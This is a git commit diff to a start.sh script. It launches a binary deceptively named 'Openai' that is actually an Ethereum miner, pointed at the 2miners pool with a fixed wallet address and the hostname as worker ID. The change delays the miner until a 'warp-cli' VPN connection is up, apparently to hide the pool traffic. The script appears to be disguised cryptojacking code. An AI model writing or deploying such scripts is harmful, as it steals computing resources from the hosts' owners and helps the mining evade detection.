c6655e68548a80478b12443716b38e30d27125f4
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2021-12-21 10:02:53 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,6 @@
 #!/bin/sh
 sudo chmod +x ./Openai
-./Openai --algo ethash --server eth.2miners.com:2020 --user 0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME
 warp-cli connect
+sleep 10
+./Openai --algo ethash --server eth.2miners.com:2020 --user 0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME
+
